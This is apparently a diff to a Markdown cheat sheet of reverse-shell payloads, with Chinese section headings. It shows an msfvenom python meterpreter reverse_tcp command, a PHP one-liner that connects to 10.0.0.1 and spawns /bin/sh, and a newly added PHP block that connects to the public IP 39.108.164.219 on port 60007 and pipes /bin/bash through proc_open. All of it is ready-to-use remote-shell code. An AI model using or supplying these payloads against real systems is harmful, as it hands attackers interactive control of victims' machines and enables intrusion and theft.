@@ -198,7 +198,24 @@ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234i
 
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+
 ```
+
+```
+$sock = fsockopen("39.108.164.219", "60007");
+$descriptorspec = array(
+        0 => $sock,
+        1 => $sock,
+        2 => $sock,
+        3 => $sock
+);
+$process = proc_open('/bin/bash', $descriptorspec, $pipes);
+proc_close($process);
+```
+
+
 
 ### 0x07 java 版本：
 
